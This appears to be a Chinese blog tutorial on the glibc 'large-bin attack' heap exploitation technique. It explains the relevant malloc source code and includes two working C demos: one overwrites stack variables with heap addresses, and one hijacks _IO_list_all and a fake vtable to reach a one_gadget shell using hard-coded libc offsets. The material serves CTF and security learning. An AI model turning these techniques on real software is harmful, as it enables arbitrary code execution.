&emsp;&emsp;<font size=2>接下来就是`large-bin attack`环节了，这个应该也是常规堆利用手法里的最后一种了，`large-bin attack`的利用效果就是往任意地址写入一个堆地址，利用完了之后跟`unsorted-bin attack`一样链表就废了，只能利用一次。话不多说直接看demo，我略微改了一下shellphish的脚本：</font></br>

```C
#include<stdio.h>
#include<stdlib.h>
 
int main()
{
    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    unsigned long *p1 = malloc(0x320);
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    malloc(0x20);

    unsigned long *p3 = malloc(0x410);
    malloc(0x20);

    // 得到两个unsorted-bin
    free(p1);
    free(p2);

  	// p1和p2先被放入smallbin和largebin链表
    // 因为找不到合适大小的unsorted-bin，smallbin被拿出来切割
    // 又成为一块unsorted-bin，因此此时堆块结构为一块unsorted-bin和一块larrge-bin
    malloc(0x90);

  	// 再得到一块unsorted-bin
    free(p3);
 
    p2[0] = 0;		// fd
    p2[2] = 0;		// fd_nextsize
    p2[1] = (unsigned long)(&stack_var1 - 2);		// bk
    p2[3] = (unsigned long)(&stack_var2 - 4);		// bk_nextsize

  	// 第二块unsorted-bin被放入large-bin list
    // 发生large-bin attack
    malloc(0x90);
 
    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}

```

&emsp;&emsp;<font size=2>我们来看看相关的`large-bin`管理代码：</font></br>

```C
static void *
_int_malloc (mstate av, size_t bytes)
{
	//...
    for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
					bck = victim->bk;
          size = chunksize (victim);
        
          //...
          
          if (in_smallbin_range (size))
            {
              //...
            }
          else
          {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        } 
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

```

&emsp;&emsp;<font size=2>这些就是我们需要关注的，在本例中我们要链入的`large-bin`比在目前链表中的所有堆块都要大（虽然只有一个），插入在链表头部，因此要完成的操作如下：</font></br>

```C
                      if ((unsigned long) size == (unsigned long) fwd->size)
                        //...
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;
```

&emsp;&emsp;<font size=2>fwd此时为已链表中的堆块地址，victim为正要链入的large堆块。指针都是指向堆块头部的，因此各个成员的偏移如下：</font></br>

```C
victim->fd_nextsize;	// [victim + 0x20]
victim->bk_nextsize:	// [victim + 0x28]
victim->bk;						// [victim + 0x18]
victim->fd;						// [victim + 0x10]
```

&emsp;&emsp;<font size=2>而`fwd`就是目前链表中的唯一的堆块，其各个指针已经被我们篡改过，因此`large-bin attack`最终完成额的操作相当于：</font></br>

```C
p2[0] = 0;
p2[2] = 0;
p2[1] = (unsigned long)(&stack_var1 - 2);
p2[3] = (unsigned long)(&stack_var2 - 4);

//victim->bk_nextsize->fd_nextsize = victim; 相当于
fwd->bk_nextsize->fd_nextsize = victim;	// *(&stack_var2 - 0x20 + 0x20) = victim;
// bck = fwd->bk;和bck->fd = victim;相当于
fwd->bk->fd = victim;	// *(&stack_var1 - 0x10 + 0x10) = victim;
```

&emsp;&emsp;<font size=2>因此最后两个变量都被修改为了堆地址，利用这一个`large-bin attck`我们可以劫持`vtable`，`_IO_FILE`结构体啊等等等等，不过最好有个重叠堆块，不然在链入堆块的时候因为四个指针都会修改，会破坏原来布置好的数据。利用这一个技巧我们可以简单的劫持一下vtable试试：</font></br>

```C
#include<stdio.h>
#include<stdlib.h>
 
typedef unsigned long ul;

int main()
{
	void *p1, *p2, *p3, *p4;
	ul *p;
	ul libc_base = 0;
	ul one_gadget = 0xf1147;
	ul _IO_list_all = 0x3c5520;

	p1 = malloc(0x400);
	malloc(0x20);
	p2 = malloc(0x410);
	malloc(0x20);
	p3 = malloc(0x420);
	malloc(0x20);

	free(p1);
	free(p2);
	p = (ul*)p1;
	libc_base = *p - 0x3c4b78;

	malloc(0x20);
	free(p3);

	p = (ul*)p2;
	*p = 0;
	*(p+1) = libc_base + _IO_list_all - sizeof(void*)*2;
	*(p+2) = 0;
	*(p+3) = libc_base + _IO_list_all - sizeof(void*)*4;

	malloc(0x20);
	p = (ul*)((ul)p3 - sizeof(void*)*2);
	*p = 0;
	*(p + 4) = 0;  // IO_write_base
	*(p + 5) = 1;  // IO_write_ptr
	*(p + 27) = (ul)p;  // vtable
	*(p + 3) = libc_base + one_gadget;  // __overflow

	// trigger it
	free(p3);

	return 0;
}

/*
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/

```

&emsp;&emsp;<font size=2>这个好像没啥甜品技术，反正要注意`large-bin`不但可以泄漏libc还可以泄漏堆地址，跟`unsorted-bin`不一样的地方就是往任意地址写的是堆地址，而不是`unsorted-bin`的地址。</font></br>

